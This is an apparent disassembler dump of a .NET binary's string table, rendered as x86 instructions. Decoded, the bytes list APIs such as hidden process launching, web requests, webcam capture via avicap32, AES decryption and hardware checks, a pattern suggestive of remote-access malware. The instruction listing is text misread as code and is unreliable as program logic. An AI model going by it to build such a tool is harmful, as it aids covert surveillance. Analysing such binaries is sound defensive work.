  40852e:	73 57                	jae    0x408587
  408530:	69 74 68 00 45 78 69 	imul   $0x73697845,0x0(%eax,%ebp,2),%esi
  408537:	73 
  408538:	74 73                	je     0x4085ad
  40853a:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40853e:	6f                   	outsl  %ds:(%esi),(%dx)
  40853f:	6f                   	outsl  %ds:(%esi),(%dx)
  408540:	6c                   	insb   (%dx),%es:(%edi)
  408541:	65 61                	gs popa
  408543:	6e                   	outsb  %ds:(%esi),(%dx)
  408544:	00 53 74             	add    %dl,0x74(%ebx)
  408547:	6f                   	outsl  %ds:(%esi),(%dx)
  408548:	70 77                	jo     0x4085c1
  40854a:	61                   	popa
  40854b:	74 63                	je     0x4085b0
  40854d:	68 00 46 72 6f       	push   $0x6f724600
  408552:	6d                   	insl   (%dx),%es:(%edi)
  408553:	53                   	push   %ebx
  408554:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408558:	64 73 00             	fs jae 0x40855b
  40855b:	67 65 74 5f          	addr16 gs je 0x4085be
  40855f:	45                   	inc    %ebp
  408560:	6c                   	insb   (%dx),%es:(%edi)
  408561:	61                   	popa
  408562:	70 73                	jo     0x4085d7
  408564:	65 64 00 6f 70       	gs add %ch,%fs:0x70(%edi)
  408569:	5f                   	pop    %edi
  40856a:	47                   	inc    %edi
  40856b:	72 65                	jb     0x4085d2
  40856d:	61                   	popa
  40856e:	74 65                	je     0x4085d5
  408570:	72 54                	jb     0x4085c6
  408572:	68 61 6e 00 53       	push   $0x53006e61
  408577:	79 73                	jns    0x4085ec
  408579:	74 65                	je     0x4085e0
  40857b:	6d                   	insl   (%dx),%es:(%edi)
  40857c:	2e 43                	cs inc %ebx
  40857e:	6f                   	outsl  %ds:(%esi),(%dx)
  40857f:	6c                   	insb   (%dx),%es:(%edi)
  408580:	6c                   	insb   (%dx),%es:(%edi)
  408581:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408586:	6e                   	outsb  %ds:(%esi),(%dx)
  408587:	73 2e                	jae    0x4085b7
  408589:	47                   	inc    %edi
  40858a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40858c:	65 72 69             	gs jb  0x4085f8
  40858f:	63 00                	arpl   %eax,(%eax)
  408591:	4c                   	dec    %esp
  408592:	69 73 74 60 31 00 41 	imul   $0x41003160,0x74(%ebx),%esi
  408599:	64 64 00 47 65       	fs add %al,%fs:0x65(%edi)
  40859e:	74 50                	je     0x4085f0
  4085a0:	72 6f                	jb     0x408611
  4085a2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4085a5:	73 65                	jae    0x40860c
  4085a7:	73 00                	jae    0x4085a9
  4085a9:	67 65 74 5f          	addr16 gs je 0x40860c
  4085ad:	4d                   	dec    %ebp
  4085ae:	61                   	popa
  4085af:	69 6e 57 69 6e 64 6f 	imul   $0x6f646e69,0x57(%esi),%ebp
  4085b6:	77 54                	ja     0x40860c
  4085b8:	69 74 6c 65 00 49 73 	imul   $0x4e734900,0x65(%esp,%ebp,2),%esi
  4085bf:	4e 
  4085c0:	75 6c                	jne    0x40862e
  4085c2:	6c                   	insb   (%dx),%es:(%edi)
  4085c3:	4f                   	dec    %edi
  4085c4:	72 45                	jb     0x40860b
  4085c6:	6d                   	insl   (%dx),%es:(%edi)
  4085c7:	70 74                	jo     0x40863d
  4085c9:	79 00                	jns    0x4085cb
  4085cb:	54                   	push   %esp
  4085cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4085cd:	4c                   	dec    %esp
  4085ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4085cf:	77 65                	ja     0x408636
  4085d1:	72 00                	jb     0x4085d3
  4085d3:	43                   	inc    %ebx
  4085d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4085d6:	74 61                	je     0x408639
  4085d8:	69 6e 73 00 46 75 6e 	imul   $0x6e754600,0x73(%esi),%ebp
  4085df:	63 60 32             	arpl   %esp,0x32(%eax)
  4085e2:	00 53 79             	add    %dl,0x79(%ebx)
  4085e5:	73 74                	jae    0x40865b
  4085e7:	65 6d                	gs insl (%dx),%es:(%edi)
  4085e9:	2e 43                	cs inc %ebx
  4085eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4085ec:	72 65                	jb     0x408653
  4085ee:	00 53 79             	add    %dl,0x79(%ebx)
  4085f1:	73 74                	jae    0x408667
  4085f3:	65 6d                	gs insl (%dx),%es:(%edi)
  4085f5:	2e 4c                	cs dec %esp
  4085f7:	69 6e 71 00 45 6e 75 	imul   $0x756e4500,0x71(%esi),%ebp
  4085fe:	6d                   	insl   (%dx),%es:(%edi)
  4085ff:	65 72 61             	gs jb  0x408663
  408602:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  408606:	49                   	dec    %ecx
  408607:	45                   	inc    %ebp
  408608:	6e                   	outsb  %ds:(%esi),(%dx)
  408609:	75 6d                	jne    0x408678
  40860b:	65 72 61             	gs jb  0x40866f
  40860e:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  408612:	31 00                	xor    %eax,(%eax)
  408614:	41                   	inc    %ecx
  408615:	6e                   	outsb  %ds:(%esi),(%dx)
  408616:	79 00                	jns    0x408618
  408618:	48                   	dec    %eax
  408619:	74 74                	je     0x40868f
  40861b:	70 57                	jo     0x408674
  40861d:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  408621:	71 75                	jno    0x408698
  408623:	65 73 74             	gs jae 0x40869a
  408626:	00 48 74             	add    %cl,0x74(%eax)
  408629:	74 70                	je     0x40869b
  40862b:	57                   	push   %edi
  40862c:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  408630:	73 70                	jae    0x4086a2
  408632:	6f                   	outsl  %ds:(%esi),(%dx)
  408633:	6e                   	outsb  %ds:(%esi),(%dx)
  408634:	73 65                	jae    0x40869b
  408636:	00 57 65             	add    %dl,0x65(%edi)
  408639:	62 52 65             	bound  %edx,0x65(%edx)
  40863c:	71 75                	jno    0x4086b3
  40863e:	65 73 74             	gs jae 0x4086b5
  408641:	00 43 72             	add    %al,0x72(%ebx)
  408644:	65 61                	gs popa
  408646:	74 65                	je     0x4086ad
  408648:	00 73 65             	add    %dh,0x65(%ebx)
  40864b:	74 5f                	je     0x4086ac
  40864d:	55                   	push   %ebp
  40864e:	73 65                	jae    0x4086b5
  408650:	72 41                	jb     0x408693
  408652:	67 65 6e             	outsb  %gs:(%si),(%dx)
  408655:	74 00                	je     0x408657
  408657:	73 65                	jae    0x4086be
  408659:	74 5f                	je     0x4086ba
  40865b:	41                   	inc    %ecx
  40865c:	6c                   	insb   (%dx),%es:(%edi)
  40865d:	6c                   	insb   (%dx),%es:(%edi)
  40865e:	6f                   	outsl  %ds:(%esi),(%dx)
  40865f:	77 41                	ja     0x4086a2
  408661:	75 74                	jne    0x4086d7
  408663:	6f                   	outsl  %ds:(%esi),(%dx)
  408664:	52                   	push   %edx
  408665:	65 64 69 72 65 63 74 	gs imul $0x73007463,%fs:0x65(%edx),%esi
  40866c:	00 73 
  40866e:	65 74 5f             	gs je  0x4086d0
  408671:	54                   	push   %esp
  408672:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  408679:	73 65                	jae    0x4086e0
  40867b:	74 5f                	je     0x4086dc
  40867d:	4d                   	dec    %ebp
  40867e:	65 74 68             	gs je  0x4086e9
  408681:	6f                   	outsl  %ds:(%esi),(%dx)
  408682:	64 00 57 65          	add    %dl,%fs:0x65(%edi)
  408686:	62 52 65             	bound  %edx,0x65(%edx)
  408689:	73 70                	jae    0x4086fb
  40868b:	6f                   	outsl  %ds:(%esi),(%dx)
  40868c:	6e                   	outsb  %ds:(%esi),(%dx)
  40868d:	73 65                	jae    0x4086f4
  40868f:	00 47 65             	add    %al,0x65(%edi)
  408692:	74 52                	je     0x4086e6
  408694:	65 73 70             	gs jae 0x408707
  408697:	6f                   	outsl  %ds:(%esi),(%dx)
  408698:	6e                   	outsb  %ds:(%esi),(%dx)
  408699:	73 65                	jae    0x408700
  40869b:	00 53 70             	add    %dl,0x70(%ebx)
  40869e:	61                   	popa
  40869f:	63 65 00             	arpl   %esp,0x0(%ebp)
  4086a2:	50                   	push   %eax
  4086a3:	72 6f                	jb     0x408714
  4086a5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086a8:	73 53                	jae    0x4086fd
  4086aa:	74 61                	je     0x40870d
  4086ac:	72 74                	jb     0x408722
  4086ae:	49                   	dec    %ecx
  4086af:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086b2:	00 57 72             	add    %dl,0x72(%edi)
  4086b5:	69 74 65 41 6c 6c 42 	imul   $0x79426c6c,0x41(%ebp,%eiz,2),%esi
  4086bc:	79 
  4086bd:	74 65                	je     0x408724
  4086bf:	73 00                	jae    0x4086c1
  4086c1:	45                   	inc    %ebp
  4086c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c3:	64 73 57             	fs jae 0x40871d
  4086c6:	69 74 68 00 50 72 6f 	imul   $0x636f7250,0x0(%eax,%ebp,2),%esi
  4086cd:	63 
  4086ce:	65 73 73             	gs jae 0x408744
  4086d1:	57                   	push   %edi
  4086d2:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4086d9:	79 6c                	jns    0x408747
  4086db:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4086df:	74 5f                	je     0x408740
  4086e1:	57                   	push   %edi
  4086e2:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4086e9:	79 6c                	jns    0x408757
  4086eb:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4086ef:	74 5f                	je     0x408750
  4086f1:	41                   	inc    %ecx
  4086f2:	72 67                	jb     0x40875b
  4086f4:	75 6d                	jne    0x408763
  4086f6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4086f8:	74 73                	je     0x40876d
  4086fa:	00 67 65             	add    %ah,0x65(%edi)
  4086fd:	74 5f                	je     0x40875e
  4086ff:	45                   	inc    %ebp
  408700:	6e                   	outsb  %ds:(%esi),(%dx)
  408701:	74 72                	je     0x408775
  408703:	79 50                	jns    0x408755
  408705:	6f                   	outsl  %ds:(%esi),(%dx)
  408706:	69 6e 74 00 4d 65 74 	imul   $0x74654d00,0x74(%esi),%ebp
  40870d:	68 6f 64 42 61       	push   $0x6142646f
  408712:	73 65                	jae    0x408779
  408714:	00 50 61             	add    %dl,0x61(%eax)
  408717:	72 61                	jb     0x40877a
  408719:	6d                   	insl   (%dx),%es:(%edi)
  40871a:	65 74 65             	gs je  0x408782
  40871d:	72 49                	jb     0x408768
  40871f:	6e                   	outsb  %ds:(%esi),(%dx)
  408720:	66 6f                	outsw  %ds:(%esi),(%dx)
  408722:	00 47 65             	add    %al,0x65(%edi)
  408725:	74 50                	je     0x408777
  408727:	61                   	popa
  408728:	72 61                	jb     0x40878b
  40872a:	6d                   	insl   (%dx),%es:(%edi)
  40872b:	65 74 65             	gs je  0x408793
  40872e:	72 73                	jb     0x4087a3
  408730:	00 45 6e             	add    %al,0x6e(%ebp)
  408733:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408736:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40873d:	5f                   	pop    %edi
  40873e:	55                   	push   %ebp
  40873f:	54                   	push   %esp
  408740:	46                   	inc    %esi
  408741:	38 00                	cmp    %al,(%eax)
  408743:	47                   	inc    %edi
  408744:	65 74 42             	gs je  0x408789
  408747:	79 74                	jns    0x4087bd
  408749:	65 73 00             	gs jae 0x40874c
  40874c:	44                   	inc    %esp
  40874d:	6c                   	insb   (%dx),%es:(%edi)
  40874e:	6c                   	insb   (%dx),%es:(%edi)
  40874f:	49                   	dec    %ecx
  408750:	6d                   	insl   (%dx),%es:(%edi)
  408751:	70 6f                	jo     0x4087c2
  408753:	72 74                	jb     0x4087c9
  408755:	41                   	inc    %ecx
  408756:	74 74                	je     0x4087cc
  408758:	72 69                	jb     0x4087c3
  40875a:	62 75 74             	bound  %esi,0x74(%ebp)
  40875d:	65 00 61 76          	add    %ah,%gs:0x76(%ecx)
  408761:	69 63 61 70 33 32 2e 	imul   $0x2e323370,0x61(%ebx),%esp
  408768:	64 6c                	fs insb (%dx),%es:(%edi)
  40876a:	6c                   	insb   (%dx),%es:(%edi)
  40876b:	00 4d 61             	add    %cl,0x61(%ebp)
  40876e:	72 73                	jb     0x4087e3
  408770:	68 61 6c 41 73       	push   $0x73416c61
  408775:	41                   	inc    %ecx
  408776:	74 74                	je     0x4087ec
  408778:	72 69                	jb     0x4087e3
  40877a:	62 75 74             	bound  %esi,0x74(%ebp)
  40877d:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  408781:	6d                   	insl   (%dx),%es:(%edi)
  408782:	61                   	popa
  408783:	6e                   	outsb  %ds:(%esi),(%dx)
  408784:	61                   	popa
  408785:	67 65 64 54          	addr16 gs fs push %esp
  408789:	79 70                	jns    0x4087fb
  40878b:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  40878f:	72 65                	jb     0x4087f6
  408791:	61                   	popa
  408792:	6d                   	insl   (%dx),%es:(%edi)
  408793:	57                   	push   %edi
  408794:	72 69                	jb     0x4087ff
  408796:	74 65                	je     0x4087fd
  408798:	72 00                	jb     0x40879a
  40879a:	47                   	inc    %edi
  40879b:	65 74 54             	gs je  0x4087f2
  40879e:	65 6d                	gs insl (%dx),%es:(%edi)
  4087a0:	70 46                	jo     0x4087e8
  4087a2:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4087a9:	00 
  4087aa:	54                   	push   %esp
  4087ab:	65 78 74             	gs js  0x408822
  4087ae:	57                   	push   %edi
  4087af:	72 69                	jb     0x40881a
  4087b1:	74 65                	je     0x408818
  4087b3:	72 00                	jb     0x4087b5
  4087b5:	57                   	push   %edi
  4087b6:	72 69                	jb     0x408821
  4087b8:	74 65                	je     0x40881f
  4087ba:	4c                   	dec    %esp
  4087bb:	69 6e 65 00 67 65 74 	imul   $0x74656700,0x65(%esi),%ebp
  4087c2:	5f                   	pop    %edi
  4087c3:	53                   	push   %ebx
  4087c4:	74 61                	je     0x408827
  4087c6:	72 74                	jb     0x40883c
  4087c8:	75 70                	jne    0x40883a
  4087ca:	50                   	push   %eax
  4087cb:	61                   	popa
  4087cc:	74 68                	je     0x408836
  4087ce:	00 67 65             	add    %ah,0x65(%edi)
  4087d1:	74 5f                	je     0x408832
  4087d3:	45                   	inc    %ebp
  4087d4:	78 65                	js     0x40883b
  4087d6:	63 75 74             	arpl   %esi,0x74(%ebp)
  4087d9:	61                   	popa
  4087da:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  4087de:	61                   	popa
  4087df:	74 68                	je     0x408849
  4087e1:	00 73 65             	add    %dh,0x65(%ebx)
  4087e4:	74 5f                	je     0x408845
  4087e6:	46                   	inc    %esi
  4087e7:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4087ee:	00 
  4087ef:	73 65                	jae    0x408856
  4087f1:	74 5f                	je     0x408852
  4087f3:	43                   	inc    %ebx
  4087f4:	72 65                	jb     0x40885b
  4087f6:	61                   	popa
  4087f7:	74 65                	je     0x40885e
  4087f9:	4e                   	dec    %esi
  4087fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4087fb:	57                   	push   %edi
  4087fc:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  408803:	65 74 5f             	gs je  0x408865
  408806:	45                   	inc    %ebp
  408807:	72 72                	jb     0x40887b
  408809:	6f                   	outsl  %ds:(%esi),(%dx)
  40880a:	72 44                	jb     0x408850
  40880c:	69 61 6c 6f 67 00 73 	imul   $0x7300676f,0x6c(%ecx),%esp
  408813:	65 74 5f             	gs je  0x408875
  408816:	55                   	push   %ebp
  408817:	73 65                	jae    0x40887e
  408819:	53                   	push   %ebx
  40881a:	68 65 6c 6c 45       	push   $0x456c6c65
  40881f:	78 65                	js     0x408886
  408821:	63 75 74             	arpl   %esi,0x74(%ebp)
  408824:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  408828:	74 50                	je     0x40887a
  40882a:	74 72                	je     0x40889e
  40882c:	00 5a 65             	add    %bl,0x65(%edx)
  40882f:	72 6f                	jb     0x4088a0
  408831:	00 52 75             	add    %dl,0x75(%edx)
  408834:	6e                   	outsb  %ds:(%esi),(%dx)
  408835:	00 47 65             	add    %al,0x65(%edi)
  408838:	74 43                	je     0x40887d
  40883a:	75 72                	jne    0x4088ae
  40883c:	72 65                	jb     0x4088a3
  40883e:	6e                   	outsb  %ds:(%esi),(%dx)
  40883f:	74 50                	je     0x408891
  408841:	72 6f                	jb     0x4088b2
  408843:	63 65 73             	arpl   %esp,0x73(%ebp)
  408846:	73 00                	jae    0x408848
  408848:	67 65 74 5f          	addr16 gs je 0x4088ab
  40884c:	50                   	push   %eax
  40884d:	72 6f                	jb     0x4088be
  40884f:	63 65 73             	arpl   %esp,0x73(%ebp)
  408852:	73 4e                	jae    0x4088a2
  408854:	61                   	popa
  408855:	6d                   	insl   (%dx),%es:(%edi)
  408856:	65 00 6f 70          	add    %ch,%gs:0x70(%edi)
  40885a:	5f                   	pop    %edi
  40885b:	45                   	inc    %ebp
  40885c:	78 70                	js     0x4088ce
  40885e:	6c                   	insb   (%dx),%es:(%edi)
  40885f:	69 63 69 74 00 6f 70 	imul   $0x706f0074,0x69(%ebx),%esp
  408866:	5f                   	pop    %edi
  408867:	45                   	inc    %ebp
  408868:	71 75                	jno    0x4088df
  40886a:	61                   	popa
  40886b:	6c                   	insb   (%dx),%es:(%edi)
  40886c:	69 74 79 00 4d 61 72 	imul   $0x7372614d,0x0(%ecx,%edi,2),%esi
  408873:	73 
  408874:	68 61 6c 00 52       	push   $0x52006c61
  408879:	65 61                	gs popa
  40887b:	64 49                	fs dec %ecx
  40887d:	6e                   	outsb  %ds:(%esi),(%dx)
  40887e:	74 33                	je     0x4088b3
  408880:	32 00                	xor    (%eax),%al
  408882:	54                   	push   %esp
  408883:	6f                   	outsl  %ds:(%esi),(%dx)
  408884:	55                   	push   %ebp
  408885:	49                   	dec    %ecx
  408886:	6e                   	outsb  %ds:(%esi),(%dx)
  408887:	74 65                	je     0x4088ee
  408889:	67 65 72 00          	addr16 gs jb 0x40888d
  40888d:	4b                   	dec    %ebx
  40888e:	65 79 73             	gs jns 0x408904
  408891:	00 67 65             	add    %ah,0x65(%edi)
  408894:	74 5f                	je     0x4088f5
  408896:	4e                   	dec    %esi
  408897:	65 77 4c             	gs ja  0x4088e6
  40889a:	69 6e 65 00 55 49 6e 	imul   $0x6e495500,0x65(%esi),%ebp
  4088a1:	74 33                	je     0x4088d6
  4088a3:	32 00                	xor    (%eax),%al
  4088a5:	47                   	inc    %edi
  4088a6:	65 74 50             	gs je  0x4088f9
  4088a9:	72 6f                	jb     0x40891a
  4088ab:	63 65 73             	arpl   %esp,0x73(%ebp)
  4088ae:	73 42                	jae    0x4088f2
  4088b0:	79 49                	jns    0x4088fb
  4088b2:	64 00 49 73          	add    %cl,%fs:0x73(%ecx)
  4088b6:	4e                   	dec    %esi
  4088b7:	75 6c                	jne    0x408925
  4088b9:	6c                   	insb   (%dx),%es:(%edi)
  4088ba:	4f                   	dec    %edi
  4088bb:	72 57                	jb     0x408914
  4088bd:	68 69 74 65 53       	push   $0x53657469
  4088c2:	70 61                	jo     0x408925
  4088c4:	63 65 00             	arpl   %esp,0x0(%ebp)
  4088c7:	75 73                	jne    0x40893c
  4088c9:	65 72 33             	gs jb  0x4088ff
  4088cc:	32 2e                	xor    (%esi),%ch
  4088ce:	64 6c                	fs insb (%dx),%es:(%edi)
  4088d0:	6c                   	insb   (%dx),%es:(%edi)
  4088d1:	00 6b 65             	add    %ch,0x65(%ebx)
  4088d4:	72 6e                	jb     0x408944
  4088d6:	65 6c                	gs insb (%dx),%es:(%edi)
  4088d8:	33 32                	xor    (%edx),%esi
  4088da:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4088dd:	6c                   	insb   (%dx),%es:(%edi)
  4088de:	00 4f 75             	add    %cl,0x75(%edi)
  4088e1:	74 41                	je     0x408924
  4088e3:	74 74                	je     0x408959
  4088e5:	72 69                	jb     0x408950
  4088e7:	62 75 74             	bound  %esi,0x74(%ebp)
  4088ea:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4088ee:	73 74                	jae    0x408964
  4088f0:	65 6d                	gs insl (%dx),%es:(%edi)
  4088f2:	2e 53                	cs push %ebx
  4088f4:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4088f8:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  4088ff:	70 
  408900:	74 6f                	je     0x408971
  408902:	67 72 61             	addr16 jb 0x408966
  408905:	70 68                	jo     0x40896f
  408907:	79 00                	jns    0x408909
  408909:	52                   	push   %edx
  40890a:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%edx),%ebp
  408911:	4d                   	dec    %ebp
  408912:	61                   	popa
  408913:	6e                   	outsb  %ds:(%esi),(%dx)
  408914:	61                   	popa
  408915:	67 65 64 00 49 43    	gs add %cl,%fs:0x43(%bx,%di)
  40891b:	72 79                	jb     0x408996
  40891d:	70 74                	jo     0x408993
  40891f:	6f                   	outsl  %ds:(%esi),(%dx)
  408920:	54                   	push   %esp
  408921:	72 61                	jb     0x408984
  408923:	6e                   	outsb  %ds:(%esi),(%dx)
  408924:	73 66                	jae    0x40898c
  408926:	6f                   	outsl  %ds:(%esi),(%dx)
  408927:	72 6d                	jb     0x408996
  408929:	00 4d 44             	add    %cl,0x44(%ebp)
  40892c:	35 43 72 79 70       	xor    $0x70797243,%eax
  408931:	74 6f                	je     0x4089a2
  408933:	53                   	push   %ebx
  408934:	65 72 76             	gs jb  0x4089ad
  408937:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40893e:	69 64 65 72 00 48 61 	imul   $0x73614800,0x72(%ebp,%eiz,2),%esp
  408945:	73 
  408946:	68 41 6c 67 6f       	push   $0x6f676c41
  40894b:	72 69                	jb     0x4089b6
  40894d:	74 68                	je     0x4089b7
  40894f:	6d                   	insl   (%dx),%es:(%edi)
  408950:	00 43 6f             	add    %al,0x6f(%ebx)
  408953:	6d                   	insl   (%dx),%es:(%edi)
  408954:	70 75                	jo     0x4089cb
  408956:	74 65                	je     0x4089bd
  408958:	48                   	dec    %eax
  408959:	61                   	popa
  40895a:	73 68                	jae    0x4089c4
  40895c:	00 41 72             	add    %al,0x72(%ecx)
  40895f:	72 61                	jb     0x4089c2
  408961:	79 00                	jns    0x408963
  408963:	43                   	inc    %ebx
  408964:	6f                   	outsl  %ds:(%esi),(%dx)
  408965:	70 79                	jo     0x4089e0
  408967:	00 53 79             	add    %dl,0x79(%ebx)
  40896a:	6d                   	insl   (%dx),%es:(%edi)
  40896b:	6d                   	insl   (%dx),%es:(%edi)
  40896c:	65 74 72             	gs je  0x4089e1
  40896f:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408976:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%eax,%ebp,2),%esi
  40897d:	74 
  40897e:	5f                   	pop    %edi
  40897f:	4b                   	dec    %ebx
  408980:	65 79 00             	gs jns 0x408983
  408983:	43                   	inc    %ebx
  408984:	69 70 68 65 72 4d 6f 	imul   $0x6f4d7265,0x68(%eax),%esi
  40898b:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  408990:	74 5f                	je     0x4089f1
  408992:	4d                   	dec    %ebp
  408993:	6f                   	outsl  %ds:(%esi),(%dx)
  408994:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  408999:	65 61                	gs popa
  40899b:	74 65                	je     0x408a02
  40899d:	44                   	inc    %esp
  40899e:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4089a2:	70 74                	jo     0x408a18
  4089a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089a5:	72 00                	jb     0x4089a7
  4089a7:	54                   	push   %esp
  4089a8:	72 61                	jb     0x408a0b
  4089aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ab:	73 66                	jae    0x408a13
  4089ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ae:	72 6d                	jb     0x408a1d
  4089b0:	46                   	inc    %esi
  4089b1:	69 6e 61 6c 42 6c 6f 	imul   $0x6f6c426c,0x61(%esi),%ebp
  4089b8:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4089bb:	50                   	push   %eax
  4089bc:	72 6f                	jb     0x408a2d
  4089be:	63 65 73             	arpl   %esp,0x73(%ebp)
  4089c1:	73 4d                	jae    0x408a10
  4089c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4089c4:	64 75 6c             	fs jne 0x408a33
  4089c7:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4089cb:	74 5f                	je     0x408a2c
  4089cd:	4d                   	dec    %ebp
  4089ce:	61                   	popa
  4089cf:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  4089d6:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4089da:	74 5f                	je     0x408a3b
  4089dc:	46                   	inc    %esi
  4089dd:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4089e4:	00 
  4089e5:	55                   	push   %ebp
  4089e6:	72 69                	jb     0x408a51
  4089e8:	00 55 72             	add    %dl,0x72(%ebp)
  4089eb:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  4089f2:	6d                   	insl   (%dx),%es:(%edi)
  4089f3:	65 54                	gs push %esp
  4089f5:	79 70                	jns    0x408a67
  4089f7:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  4089fb:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  4089ff:	6f                   	outsl  %ds:(%esi),(%dx)
  408a00:	73 74                	jae    0x408a76
  408a02:	4e                   	dec    %esi
  408a03:	61                   	popa
  408a04:	6d                   	insl   (%dx),%es:(%edi)
  408a05:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408a09:	74 5f                	je     0x408a6a
  408a0b:	43                   	inc    %ebx
  408a0c:	68 61 72 73 00       	push   $0x737261
  408a11:	53                   	push   %ebx
  408a12:	69 7a 65 4f 66 00 67 	imul   $0x6700664f,0x65(%edx),%edi
  408a19:	65 74 5f             	gs je  0x408a7b
  408a1c:	54                   	push   %esp
  408a1d:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
  408a24:	74 00                	je     0x408a26
  408a26:	47                   	inc    %edi
  408a27:	65 74 53             	gs je  0x408a7d
  408a2a:	74 72                	je     0x408a9e
  408a2c:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408a33:	5f                   	pop    %edi
  408a34:	50                   	push   %eax
  408a35:	72 6f                	jb     0x408aa6
  408a37:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a3a:	73 6f                	jae    0x408aab
  408a3c:	72 43                	jb     0x408a81
  408a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  408a3f:	75 6e                	jne    0x408aaf
  408a41:	74 00                	je     0x408a43
  408a43:	67 65 74 5f          	addr16 gs je 0x408aa6
  408a47:	53                   	push   %ebx
  408a48:	79 73                	jns    0x408abd
  408a4a:	74 65                	je     0x408ab1
  408a4c:	6d                   	insl   (%dx),%es:(%edi)
  408a4d:	44                   	inc    %esp
  408a4e:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  408a55:	79 00                	jns    0x408a57
  408a57:	47                   	inc    %edi
  408a58:	65 74 50             	gs je  0x408aab
  408a5b:	61                   	popa
  408a5c:	74 68                	je     0x408ac6
  408a5e:	52                   	push   %edx
  408a5f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a60:	6f                   	outsl  %ds:(%esi),(%dx)
  408a61:	74 00                	je     0x408a63
  408a63:	44                   	inc    %esp
  408a64:	72 69                	jb     0x408acf
  408a66:	76 65                	jbe    0x408acd
  408a68:	49                   	dec    %ecx
  408a69:	6e                   	outsb  %ds:(%esi),(%dx)
  408a6a:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a6c:	00 67 65             	add    %ah,0x65(%edi)
  408a6f:	74 5f                	je     0x408ad0
  408a71:	54                   	push   %esp
  408a72:	6f                   	outsl  %ds:(%esi),(%dx)
  408a73:	74 61                	je     0x408ad6
  408a75:	6c                   	insb   (%dx),%es:(%edi)
  408a76:	53                   	push   %ebx
  408a77:	69 7a 65 00 49 6e 74 	imul   $0x746e4900,0x65(%edx),%edi
  408a7e:	36 34 00             	ss xor $0x0,%al
  408a81:	67 65 74 5f          	addr16 gs je 0x408ae4
  408a85:	41                   	inc    %ecx
  408a86:	53                   	push   %ebx
  408a87:	43                   	inc    %ebx
  408a88:	49                   	dec    %ecx
  408a89:	49                   	dec    %ecx
  408a8a:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  408a8e:	70 70                	jo     0x408b00
  408a90:	65 72 00             	gs jb  0x408a93
  408a93:	52                   	push   %edx
  408a94:	65 67 69 73 74 72 79 	imul   $0x43007972,%gs:0x74(%bp,%di),%esi
  408a9b:	00 43 
  408a9d:	75 72                	jne    0x408b11
  408a9f:	72 65                	jb     0x408b06
